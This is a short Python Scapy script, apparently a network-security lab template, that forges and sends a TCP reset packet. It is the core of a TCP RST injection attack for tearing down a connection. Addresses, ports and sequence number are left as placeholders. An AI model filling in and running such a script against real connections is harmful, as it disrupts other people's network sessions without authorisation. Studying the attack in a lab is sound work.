#!/usr/bin/python3
from scapy.all import *

print("SENDING RESET PACKET.........")
ip = IP(src="*.*.*.*", dst="*.*.*.*")
tcp = TCP(sport="**", dport="**", seq="**", flags="R")
pkt = ip / tcp
ls(pkt)
send(pkt, verbose=0)
